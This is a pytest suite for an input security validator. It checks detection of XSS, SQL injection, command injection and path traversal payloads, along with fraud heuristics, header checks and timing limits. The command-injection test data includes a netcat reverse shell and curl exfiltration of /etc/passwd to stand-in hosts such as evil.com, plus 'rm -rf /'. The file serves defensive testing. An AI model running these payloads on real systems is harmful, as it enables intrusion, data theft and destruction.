#!/usr/bin/env python3
"""
Comprehensive Test Suite for SecurityValidationRules

Tests all security validation scenarios including XSS prevention, 
SQL injection detection, fraud pattern recognition, and threat assessment.

Security Requirement: Must prevent all known attack vectors
Performance Requirement: Security checks must complete in <50ms
Coverage Target: >95% code coverage for security-critical code
"""

import pytest
import time
from unittest.mock import patch, MagicMock
from typing import Any, Dict, List, Tuple

from app.utils.validation_rules.security_rules import SecurityValidationRules


class TestSecurityValidationRules:
    """Test the main SecurityValidationRules class"""

    @pytest.fixture
    def security_validator(self):
        """Create a fresh security validator instance for each test"""
        return SecurityValidationRules()

    def test_security_validator_initialization(self, security_validator):
        """Test security validator initializes with all patterns"""
        # Check XSS patterns are loaded
        assert len(security_validator.XSS_PATTERNS) >= 8, "Should have XSS patterns loaded"
        
        # Check SQL injection patterns are loaded
        assert len(security_validator.SQL_INJECTION_PATTERNS) >= 6, "Should have SQL injection patterns loaded"
        
        # Check command injection patterns are loaded
        assert len(security_validator.COMMAND_INJECTION_PATTERNS) >= 4, "Should have command injection patterns loaded"
        
        # Check fraud patterns are loaded
        assert 'email_domains' in security_validator.FRAUD_PATTERNS
        assert 'phone_patterns' in security_validator.FRAUD_PATTERNS
        assert 'suspicious_strings' in security_validator.FRAUD_PATTERNS
        
        # Check security headers config is loaded
        assert 'required' in security_validator.SECURITY_HEADERS
        assert 'recommended' in security_validator.SECURITY_HEADERS


class TestXSSPrevention:
    """Test XSS (Cross-Site Scripting) prevention functionality"""

    @pytest.fixture
    def security_validator(self):
        return SecurityValidationRules()

    @pytest.mark.parametrize("xss_payload", [
        "<script>alert('xss')</script>",
        "<SCRIPT>alert('XSS')</SCRIPT>",
        "<script type='text/javascript'>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<object data='javascript:alert(1)'></object>",
        "<embed src='javascript:alert(1)'>",
        "javascript:alert('xss')",
        "JAVASCRIPT:alert('XSS')",
        "<div onclick='alert(1)'>Click me</div>",
        "<input onmouseover='alert(1)'>",
        "<body onload='alert(1)'>",
        "vbscript:msgbox('xss')",
        "expression(alert('xss'))",
        "<svg onload=alert('xss')>",
        "<%73%63%72%69%70%74>alert('xss')<%2f%73%63%72%69%70%74>",  # URL encoded
        "&#60;script&#62;alert('xss')&#60;/script&#62;",  # HTML entity encoded
    ])
    def test_detect_xss_payloads(self, security_validator, xss_payload):
        """Test detection of various XSS attack payloads"""
        is_safe, error_msg, analysis = security_validator.validate_input_security(xss_payload, 'user_input')
        
        assert is_safe is False, f"XSS payload should be detected: {xss_payload}"
        assert error_msg is not None
        assert "XSS" in error_msg or "script" in error_msg.lower()
        assert analysis['xss_threats'] > 0, "Should detect XSS threats"

    @pytest.mark.parametrize("safe_input", [
        "Hello world",
        "user@example.com",
        "Normal text with <b>bold</b> tags",
        "Text with & ampersand",
        "Price: $100 < $200",
        "Mathematical: 5 > 3",
        "File path: /path/to/file",
        "URL: https://example.com",
        "JSON: {\"key\": \"value\"}",
        "CSS: color: red;",
    ])
    def test_allow_safe_input(self, security_validator, safe_input):
        """Test that safe input is not flagged as XSS"""
        is_safe, error_msg, analysis = security_validator.validate_input_security(safe_input, 'user_input')
        
        # Safe input should pass XSS checks
        # Note: It might still fail other security checks, but not XSS specifically
        if not is_safe:
            assert "XSS" not in error_msg, f"Safe input should not trigger XSS detection: {safe_input}"

    def test_xss_case_insensitive_detection(self, security_validator):
        """Test XSS detection is case-insensitive"""
        xss_variations = [
            "<Script>alert(1)</Script>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<ScRiPt>alert(1)</ScRiPt>",
            "JavaScript:alert(1)",
            "JAVASCRIPT:alert(1)",
            "VBScript:msgbox(1)",
            "VBSCRIPT:msgbox(1)"
        ]
        
        for xss_payload in xss_variations:
            is_safe, error_msg, analysis = security_validator.validate_input_security(xss_payload, 'user_input')
            assert is_safe is False, f"Case variation should be detected: {xss_payload}"

    def test_xss_with_whitespace_variations(self, security_validator):
        """Test XSS detection with whitespace variations"""
        xss_with_whitespace = [
            "< script >alert(1)< /script >",
            "<\tscript>alert(1)</script>",
            "<\nscript>alert(1)</script>",
            "<script\t>alert(1)</script>",
            "< iframe src = 'javascript:alert(1)' >"
        ]
        
        for xss_payload in xss_with_whitespace:
            is_safe, error_msg, analysis = security_validator.validate_input_security(xss_payload, 'user_input')
            assert is_safe is False, f"Whitespace variation should be detected: {xss_payload}"


class TestSQLInjectionPrevention:
    """Test SQL injection prevention functionality"""

    @pytest.fixture
    def security_validator(self):
        return SecurityValidationRules()

    @pytest.mark.parametrize("sql_payload", [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' OR 1=1 --",
        "admin' --",
        "' UNION SELECT * FROM passwords --",
        "1; DELETE FROM accounts",
        "' OR 'a'='a",
        "1 OR 1=1",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "' OR EXISTS(SELECT * FROM users) --",
        "1' AND SLEEP(5) --",
        "'; EXEC xp_cmdshell('dir'); --",
        "' UNION ALL SELECT NULL,username,password FROM users --",
        "admin'/**/OR/**/1=1/**/--",
        "' OR SUBSTRING(password,1,1)='a",
        "'; WAITFOR DELAY '00:00:05'; --",
        "1' AND (SELECT COUNT(*) FROM users) > 0 --",
        "'; LOAD_FILE('/etc/passwd'); --",
    ])
    def test_detect_sql_injection_payloads(self, security_validator, sql_payload):
        """Test detection of various SQL injection attack payloads"""
        is_safe, error_msg, analysis = security_validator.validate_input_security(sql_payload, 'user_input')
        
        assert is_safe is False, f"SQL injection payload should be detected: {sql_payload}"
        assert error_msg is not None
        assert "SQL" in error_msg or "injection" in error_msg.lower()
        assert analysis['sql_injection_threats'] > 0, "Should detect SQL injection threats"

    def test_sql_injection_case_insensitive(self, security_validator):
        """Test SQL injection detection is case-insensitive"""
        sql_variations = [
            "' or '1'='1",
            "' OR '1'='1",
            "' oR '1'='1",
            "union select * from users",
            "UNION SELECT * FROM users",
            "UnIoN sElEcT * FrOm UsErS"
        ]
        
        for sql_payload in sql_variations:
            is_safe, error_msg, analysis = security_validator.validate_input_security(sql_payload, 'user_input')
            assert is_safe is False, f"SQL injection case variation should be detected: {sql_payload}"

    def test_sql_injection_with_comments(self, security_validator):
        """Test SQL injection detection with comment variations"""
        sql_with_comments = [
            "1' OR 1=1 --",
            "1' OR 1=1 #",
            "1' OR 1=1 /* comment */",
            "admin'-- comment",
            "test'# MySQL comment",
            "user'/* block comment */ OR 1=1"
        ]
        
        for sql_payload in sql_with_comments:
            is_safe, error_msg, analysis = security_validator.validate_input_security(sql_payload, 'user_input')
            assert is_safe is False, f"SQL injection with comment should be detected: {sql_payload}"

    @pytest.mark.parametrize("safe_sql_like_input", [
        "user's name",
        "It's a test",
        "Price = $100",
        "SELECT option from menu",  # Context matters
        "The union of sets",
        "Insert key here",
        "Update your profile",
        "Delete this item"
    ])
    def test_allow_safe_sql_like_input(self, security_validator, safe_sql_like_input):
        """Test that legitimate text with SQL-like words is handled appropriately"""
        is_safe, error_msg, analysis = security_validator.validate_input_security(safe_sql_like_input, 'description')
        
        # This is context-dependent. Some inputs might be flagged depending on implementation
        # The key is that legitimate uses should be distinguishable from attacks
        if not is_safe and "SQL" in error_msg:
            # If flagged as SQL injection, it should be for good reason
            # Check that it's not just the presence of SQL keywords
            assert any(pattern in safe_sql_like_input.lower() for pattern in ["'", '"', '--', '#'])


class TestCommandInjectionPrevention:
    """Test command injection prevention functionality"""

    @pytest.fixture
    def security_validator(self):
        return SecurityValidationRules()

    @pytest.mark.parametrize("command_payload", [
        "; ls -la",
        "| cat /etc/passwd",
        "& whoami",
        "`id`",
        "$(whoami)",
        "; rm -rf /",
        "| nc -e /bin/sh attacker.com 1234",
        "; curl http://evil.com/steal?data=",
        "$(curl -X POST -d @/etc/passwd evil.com)",
        "; kill -9 $$",
        "../../../etc/passwd",
        "..\\..\\windows\\system32\\cmd.exe",
        "${PATH}",
        "${HOME}/.bashrc",
        "; sudo su -",
        "| chmod 777 /etc/passwd"
    ])
    def test_detect_command_injection_payloads(self, security_validator, command_payload):
        """Test detection of command injection attack payloads"""
        is_safe, error_msg, analysis = security_validator.validate_input_security(command_payload, 'filename')
        
        assert is_safe is False, f"Command injection payload should be detected: {command_payload}"
        assert error_msg is not None
        assert "command" in error_msg.lower() or "injection" in error_msg.lower()
        assert analysis['command_injection_threats'] > 0, "Should detect command injection threats"

    def test_path_traversal_detection(self, security_validator):
        """Test detection of path traversal attempts"""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....\\\\....\\\\....\\\\etc\\passwd"
        ]
        
        for payload in path_traversal_payloads:
            is_safe, error_msg, analysis = security_validator.validate_input_security(payload, 'filepath')
            assert is_safe is False, f"Path traversal should be detected: {payload}"

    def test_variable_expansion_detection(self, security_validator):
        """Test detection of variable expansion attempts"""
        variable_payloads = [
            "${HOME}",
            "${PATH}",
            "${USER}",
            "$HOME",
            "$PATH",
            "${IFS}cat${IFS}/etc/passwd"
        ]
        
        for payload in variable_payloads:
            is_safe, error_msg, analysis = security_validator.validate_input_security(payload, 'input')
            assert is_safe is False, f"Variable expansion should be detected: {payload}"


class TestFraudPatternDetection:
    """Test fraud pattern detection functionality"""

    @pytest.fixture
    def security_validator(self):
        return SecurityValidationRules()

    def test_detect_temporary_email_domains(self, security_validator):
        """Test detection of temporary/disposable email domains"""
        temp_emails = [
            "user@10minutemail.com",
            "test@tempmail.org",
            "fake@guerrillamail.com",
            "spam@mailinator.com",
            "throw@yopmail.com",
            "temp@throwaway.email"
        ]
        
        for email in temp_emails:
            is_legit, fraud_msg, fraud_analysis = security_validator.validate_fraud_indicators({'email': email})
            assert is_legit is False, f"Temporary email should be flagged: {email}"
            assert fraud_analysis['email_risk']['is_temporary'] is True

    def test_detect_suspicious_email_domains(self, security_validator):
        """Test detection of suspicious email domains"""
        suspicious_emails = [
            "user@example.com",
            "test@test.com",
            "fake@fake.com",
            "bogus@bogus.com",
            "invalid@invalid.com",
            "dummy@dummy.com"
        ]
        
        for email in suspicious_emails:
            is_legit, fraud_msg, fraud_analysis = security_validator.validate_fraud_indicators({'email': email})
            assert is_legit is False, f"Suspicious email domain should be flagged: {email}"
            assert fraud_analysis['email_risk']['is_suspicious'] is True

    def test_detect_test_phone_numbers(self, security_validator):
        """Test detection of common test phone numbers"""
        test_phones = [
            "+15551234567",
            "+1555123456",
            "5551234567",
            "+12345678901",
            "1234567890",
            "0000000000"
        ]
        
        for phone in test_phones:
            is_legit, fraud_msg, fraud_analysis = security_validator.validate_fraud_indicators({'phone': phone})
            assert is_legit is False, f"Test phone number should be flagged: {phone}"
            assert fraud_analysis['phone_risk']['is_test_number'] is True

    def test_detect_suspicious_strings(self, security_validator):
        """Test detection of suspicious placeholder strings"""
        suspicious_names = [
            "Test User",
            "Dummy Name",
            "Fake Person",
            "John Test",
            "Sample User",
            "Example Person",
            "Lorem Ipsum",
            "Placeholder Name",
            "Qwerty User"
        ]
        
        for name in suspicious_names:
            is_legit, fraud_msg, fraud_analysis = security_validator.validate_fraud_indicators({'name': name})
            assert is_legit is False, f"Suspicious name should be flagged: {name}"
            assert fraud_analysis['name_risk']['contains_suspicious_terms'] is True

    def test_allow_legitimate_data(self, security_validator):
        """Test that legitimate data is not flagged as fraudulent"""
        legitimate_data = {
            'email': 'john.doe@gmail.com',
            'phone': '+1234567890123',  # Not a test number
            'name': 'John Doe',
            'address': '123 Main St'
        }
        
        is_legit, fraud_msg, fraud_analysis = security_validator.validate_fraud_indicators(legitimate_data)
        
        # Should pass most fraud checks
        assert fraud_analysis['email_risk']['is_temporary'] is False
        assert fraud_analysis['email_risk']['is_suspicious'] is False


class TestThreatAssessment:
    """Test overall threat assessment functionality"""

    @pytest.fixture
    def security_validator(self):
        return SecurityValidationRules()

    def test_threat_score_calculation_clean_input(self, security_validator):
        """Test threat score calculation for clean input"""
        clean_input = "john.doe@gmail.com"
        
        is_safe, error_msg, analysis = security_validator.validate_input_security(clean_input, 'email')
        
        assert is_safe is True
        assert analysis['threat_score'] == 0.0
        assert analysis['xss_threats'] == 0
        assert analysis['sql_injection_threats'] == 0
        assert analysis['command_injection_threats'] == 0

    def test_threat_score_calculation_malicious_input(self, security_validator):
        """Test threat score calculation for malicious input"""
        malicious_input = "<script>alert('xss')</script>'; DROP TABLE users; --"
        
        is_safe, error_msg, analysis = security_validator.validate_input_security(malicious_input, 'input')
        
        assert is_safe is False
        assert analysis['threat_score'] > 0.5  # High threat score
        assert analysis['xss_threats'] > 0
        assert analysis['sql_injection_threats'] > 0

    def test_threat_score_aggregation(self, security_validator):
        """Test that threat score properly aggregates multiple threat types"""
        # Input with multiple threat types
        multi_threat_input = "<script>alert(1)</script>'; SELECT * FROM users; --; ls -la"
        
        is_safe, error_msg, analysis = security_validator.validate_input_security(multi_threat_input, 'input')
        
        assert is_safe is False
        assert analysis['xss_threats'] > 0
        assert analysis['sql_injection_threats'] > 0
        assert analysis['command_injection_threats'] > 0
        
        # Threat score should reflect multiple threats
        expected_min_score = 0.7  # Multiple threats should result in high score
        assert analysis['threat_score'] >= expected_min_score

    def test_fraud_risk_assessment(self, security_validator):
        """Test fraud risk assessment functionality"""
        high_risk_data = {
            'email': 'test@10minutemail.com',  # Temporary email
            'phone': '+15551234567',          # Test phone
            'name': 'Test User',              # Suspicious name
            'amount': '999999.99'             # High amount
        }
        
        is_legit, fraud_msg, fraud_analysis = security_validator.validate_fraud_indicators(high_risk_data)
        
        assert is_legit is False
        assert fraud_analysis['overall_risk_score'] > 0.5
        assert fraud_analysis['risk_factors'] > 2  # Multiple risk factors


class TestSecurityHeaderValidation:
    """Test security header validation functionality"""

    @pytest.fixture
    def security_validator(self):
        return SecurityValidationRules()

    def test_validate_required_security_headers_present(self, security_validator):
        """Test validation when all required headers are present"""
        headers = {
            'X-Frame-Options': 'DENY',
            'X-Content-Type-Options': 'nosniff',
            'X-XSS-Protection': '1; mode=block'
        }
        
        is_secure, missing_headers, analysis = security_validator.validate_security_headers(headers)
        
        assert is_secure is True
        assert len(missing_headers) == 0
        assert analysis['required_headers_present'] == 3

    def test_validate_required_security_headers_missing(self, security_validator):
        """Test validation when required headers are missing"""
        headers = {
            'X-Frame-Options': 'DENY'
            # Missing X-Content-Type-Options and X-XSS-Protection
        }
        
        is_secure, missing_headers, analysis = security_validator.validate_security_headers(headers)
        
        assert is_secure is False
        assert len(missing_headers) >= 2
        assert 'X-Content-Type-Options' in missing_headers
        assert 'X-XSS-Protection' in missing_headers

    def test_validate_security_header_values(self, security_validator):
        """Test validation of security header values"""
        # Valid values
        valid_headers = {
            'X-Frame-Options': 'SAMEORIGIN',
            'X-Content-Type-Options': 'nosniff',
            'X-XSS-Protection': '1; mode=block'
        }
        
        is_secure, missing_headers, analysis = security_validator.validate_security_headers(valid_headers)
        assert is_secure is True
        
        # Invalid values
        invalid_headers = {
            'X-Frame-Options': 'ALLOWALL',  # Invalid value
            'X-Content-Type-Options': 'nosniff',
            'X-XSS-Protection': '1; mode=block'
        }
        
        is_secure, missing_headers, analysis = security_validator.validate_security_headers(invalid_headers)
        assert is_secure is False  # Should fail due to invalid value

    def test_validate_recommended_security_headers(self, security_validator):
        """Test validation of recommended security headers"""
        headers = {
            # Required headers
            'X-Frame-Options': 'DENY',
            'X-Content-Type-Options': 'nosniff',
            'X-XSS-Protection': '1; mode=block',
            # Recommended headers
            'Strict-Transport-Security': 'max-age=31536000',
            'Content-Security-Policy': "default-src 'self'",
            'Referrer-Policy': 'strict-origin-when-cross-origin'
        }
        
        is_secure, missing_headers, analysis = security_validator.validate_security_headers(headers)
        
        assert is_secure is True
        assert analysis['recommended_headers_present'] >= 3


class TestIPAddressSecurity:
    """Test IP address security validation"""

    @pytest.fixture
    def security_validator(self):
        return SecurityValidationRules()

    def test_detect_private_ip_addresses(self, security_validator):
        """Test detection of private IP addresses"""
        private_ips = [
            '192.168.1.1',
            '10.0.0.1',
            '172.16.0.1',
            '127.0.0.1'
        ]
        
        for ip in private_ips:
            is_safe, risk_msg, ip_analysis = security_validator.validate_ip_security(ip)
            assert ip_analysis['is_private'] is True, f"Should detect private IP: {ip}"

    def test_detect_public_ip_addresses(self, security_validator):
        """Test handling of public IP addresses"""
        public_ips = [
            '8.8.8.8',
            '1.1.1.1',
            '208.67.222.222'
        ]
        
        for ip in public_ips:
            is_safe, risk_msg, ip_analysis = security_validator.validate_ip_security(ip)
            assert ip_analysis['is_private'] is False, f"Should detect public IP: {ip}"

    def test_detect_reserved_ip_ranges(self, security_validator):
        """Test detection of reserved IP ranges"""
        reserved_ips = [
            '0.0.0.0',      # This host
            '255.255.255.255',  # Broadcast
            '169.254.1.1',  # Link-local
            '224.0.0.1',    # Multicast
            '240.0.0.1'     # Reserved for future use
        ]
        
        for ip in reserved_ips:
            is_safe, risk_msg, ip_analysis = security_validator.validate_ip_security(ip)
            # Should be flagged as suspicious or handled appropriately
            assert ip_analysis is not None


class TestPerformanceRequirements:
    """Test performance requirements for security validation"""

    @pytest.fixture
    def security_validator(self):
        return SecurityValidationRules()

    def test_security_validation_performance(self, security_validator):
        """Test security validation completes within performance requirement"""
        test_inputs = [
            "user@example.com",
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "Normal text input",
            "192.168.1.1",
            "+1234567890"
        ] * 10  # 60 inputs total
        
        start_time = time.time()
        for test_input in test_inputs:
            security_validator.validate_input_security(test_input, 'input')
        end_time = time.time()
        
        execution_time_ms = (end_time - start_time) * 1000
        assert execution_time_ms < 50, f"Security validation took {execution_time_ms}ms, should be <50ms"

    def test_fraud_detection_performance(self, security_validator):
        """Test fraud detection performance"""
        test_data_sets = []
        for i in range(25):
            test_data_sets.append({
                'email': f'user{i}@example.com',
                'phone': f'+123456789{i:02d}',
                'name': f'User {i}',
                'amount': f'{i * 100}.00'
            })
        
        start_time = time.time()
        for data in test_data_sets:
            security_validator.validate_fraud_indicators(data)
        end_time = time.time()
        
        execution_time_ms = (end_time - start_time) * 1000
        assert execution_time_ms < 50, f"Fraud detection took {execution_time_ms}ms, should be <50ms"

    def test_pattern_compilation_efficiency(self, security_validator):
        """Test that pattern compilation doesn't impact performance"""
        # Patterns should be pre-compiled, so multiple calls should be fast
        test_input = "<script>alert('test')</script>"
        
        # Warm up
        for _ in range(5):
            security_validator.validate_input_security(test_input, 'input')
        
        # Measure performance
        start_time = time.time()
        for _ in range(100):
            security_validator.validate_input_security(test_input, 'input')
        end_time = time.time()
        
        execution_time_ms = (end_time - start_time) * 1000
        per_call_time_ms = execution_time_ms / 100
        
        assert per_call_time_ms < 0.5, f"Per-call time {per_call_time_ms}ms too high, should be <0.5ms"


class TestEdgeCasesAndErrorHandling:
    """Test edge cases and error handling for security validation"""

    @pytest.fixture
    def security_validator(self):
        return SecurityValidationRules()

    def test_empty_input_handling(self, security_validator):
        """Test handling of empty inputs"""
        empty_inputs = [None, "", "   ", "\t", "\n"]
        
        for empty_input in empty_inputs:
            is_safe, error_msg, analysis = security_validator.validate_input_security(empty_input or "", 'input')
            assert isinstance(is_safe, bool)
            assert isinstance(analysis, dict)

    def test_very_long_input_handling(self, security_validator):
        """Test handling of very long inputs"""
        very_long_input = "a" * 100000  # 100KB of data
        
        start_time = time.time()
        is_safe, error_msg, analysis = security_validator.validate_input_security(very_long_input, 'input')
        end_time = time.time()
        
        # Should handle gracefully and still meet performance requirements
        execution_time_ms = (end_time - start_time) * 1000
        assert execution_time_ms < 100, "Should handle large inputs efficiently"
        
        assert isinstance(is_safe, bool)
        assert isinstance(analysis, dict)

    def test_unicode_and_special_characters(self, security_validator):
        """Test handling of Unicode and special characters"""
        unicode_inputs = [
            "用户@example.com",  # Chinese characters
            "utilisateur@exämple.com",  # Accented characters
            "пользователь@example.com",  # Cyrillic
            "🙂😀💯@example.com",  # Emoji
            "\x00\x01\x02\x03",  # Control characters
            "test\r\n\tdata"  # Mixed whitespace
        ]
        
        for unicode_input in unicode_inputs:
            # Should handle gracefully without crashing
            try:
                is_safe, error_msg, analysis = security_validator.validate_input_security(unicode_input, 'input')
                assert isinstance(is_safe, bool)
                assert isinstance(analysis, dict)
            except Exception as e:
                pytest.fail(f"Should handle Unicode gracefully: {unicode_input}, error: {e}")

    def test_malformed_fraud_data_handling(self, security_validator):
        """Test handling of malformed data in fraud detection"""
        malformed_data_sets = [
            {},  # Empty dict
            {'email': None},  # None values
            {'phone': 123},  # Wrong type
            {'invalid_field': 'value'},  # Unexpected fields
            {'email': ''},  # Empty strings
        ]
        
        for data in malformed_data_sets:
            # Should handle gracefully
            try:
                is_legit, fraud_msg, fraud_analysis = security_validator.validate_fraud_indicators(data)
                assert isinstance(is_legit, bool)
                assert isinstance(fraud_analysis, dict)
            except Exception as e:
                pytest.fail(f"Should handle malformed data gracefully: {data}, error: {e}")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--cov=app.utils.validation_rules.security_rules"])